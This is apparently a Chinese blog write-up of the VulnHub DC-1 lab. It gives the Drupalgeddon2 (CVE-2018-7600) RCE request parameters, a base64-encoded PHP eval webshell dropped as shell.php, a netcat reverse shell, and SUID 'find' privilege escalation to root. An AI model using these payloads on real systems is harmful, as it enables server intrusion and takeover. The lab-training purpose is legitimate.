# DC1：渗透实战

- 下载地址:

``` 
  https://www.vulnhub.com/entry/dc-1,292/
```
###  主机发现：

- 使用nmap扫描内网存活主机，
![image](https://github.com/hecker-zz/blog/assets/153266742/0e18d656-5228-427a-8f79-ddb5a1c91368)

- 对照DC1物理地址发现是192.168.200.152这个IP
![image](https://github.com/hecker-zz/blog/assets/153266742/c5a22eec-e1be-406d-a32d-b4bef5d10809)

###  端口扫描：
![image](https://github.com/hecker-zz/blog/assets/153266742/423deeeb-0c13-4176-91f2-ba589c99dcbd)

- 发现开放了80端口，那么直接进去看看
![image](https://github.com/hecker-zz/blog/assets/153266742/c972a6ab-7d7e-4345-929e-417b144f8d8e)

### 经过漏扫发现该地址存在CVE-2018-7600,RCE漏洞，那么直接直接利用该漏洞。
### 第一次请求：
- 进入Burpsuite把该页面请求发送到重放模块，并把请求类型改为post，并提交两个参数，
```
URL：/?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=id

请求参数：form_id=user_pass&_triggering_element_name=name
```
![image](https://github.com/hecker-zz/blog/assets/153266742/383d7082-7143-44a3-a235-30f2decdc4af)


- 点击发送后在response里搜索form_build_id，该标签里的值拿到
![image](https://github.com/hecker-zz/blog/assets/153266742/0c1c5045-280b-4395-8dee-931b6170a879)

### 第二次请求：
- 拿到后创建第二次请求，ctrl+r发送到重放模块并构造参数,在url中的`file/ajax/name/%23value/`接上刚刚拿到的值，然后再下面请求部分输入`form_build_id=`在后面也是接上刚刚拿到的值。
![image](https://github.com/hecker-zz/blog/assets/153266742/bc9c7268-8ae2-4ca3-9fd7-6ab7e93fcfe2)

- 提交请求后发现，response中执行了我们刚刚所发的id。
![image](https://github.com/hecker-zz/blog/assets/153266742/107cd0c3-477b-4e6f-a0a7-8580ca270e95)


### 发送小马到目标服务器，拿下webshell
- 既然发现了RCE那么只需要把`id`的地方替换成我们的木马即可。先把一句话木马进行bese64编码，然后用echo把它写入到当前目录中的一个文件里即可，然后再对整体进行url编码
```
一句话木马： <?php @eval($_REQUEST[777])?>
bese64编码： PD9waHAgQGV2YWwoJF9SRVFVRVNUWzc3N10pPz4=
用echo输出到当前目录下的shell.php中： echo "PD9waHAgQGV2YWwoJF9SRVFVRVNUWzc3N10pPz4="|base64 -d|tee ./shell.php
整体url编码： echo%20%22PD9waHAgQGV2YWwoJF9SRVFVRVNUWzc3N10pPz4%3d%22|base64%20%2dd|tee%20./shell.php

```
![image](https://github.com/hecker-zz/blog/assets/153266742/eb86f263-1cfe-4980-a396-c6e82d09a071)

- 点击发送后拿到返回界面的值进入第二次请求中进行之前的步骤
![image](https://github.com/hecker-zz/blog/assets/153266742/73e239a2-c6b3-4b63-b75f-66329bbe97c2)
- 访问一下目标服务器中的shell.php，发现成功了。
![image](https://github.com/hecker-zz/blog/assets/153266742/f29cdd4b-25a7-4657-b35e-4a796a3afa00)

- 直接上蚁剑连接
![image](https://github.com/hecker-zz/blog/assets/153266742/b5683883-cf4b-4851-826a-cae7997ab948)
- 拿下webshell
![image](https://github.com/hecker-zz/blog/assets/153266742/48249e45-9e8c-411d-9d86-c3317a648bfb)

### 提权
- 查看目标机是否有nc
![image](https://github.com/hecker-zz/blog/assets/153266742/10bbff6c-7b29-40ba-9995-f29563e61323)
- 发现有nc，那么直接使用nc反弹shell，首先本地进行监听21端口
![image](https://github.com/hecker-zz/blog/assets/153266742/62ef234b-f554-49a8-8a86-b351897ed7b8)

- 目标直接使用`nc -e `直接反弹shell
![image](https://github.com/hecker-zz/blog/assets/153266742/75fc7d22-96f0-4b4b-87d2-858f25e5cfc4)

- 进入交互式shell
![image](https://github.com/hecker-zz/blog/assets/153266742/c2a19f7f-5c47-4d81-bb90-d181aadc3b73)
- 使用SUID提权
```
find / -perm -u=s 2>/dev/null
mkdir zz
find zz -exec "/bin/sh" \;   不行就用:find zz -exec "/bin/bash" \;
```
![image](https://github.com/hecker-zz/blog/assets/153266742/fde8d702-06a7-4669-9b54-86f2ca2478dc)

- 提权成功，拿到rootshell
![image](https://github.com/hecker-zz/blog/assets/153266742/f0980bc4-a3a9-4367-bf73-0073ea79121e)
![image](https://github.com/hecker-zz/blog/assets/153266742/f8b293d9-651b-40b2-8a28-c8ab34878001)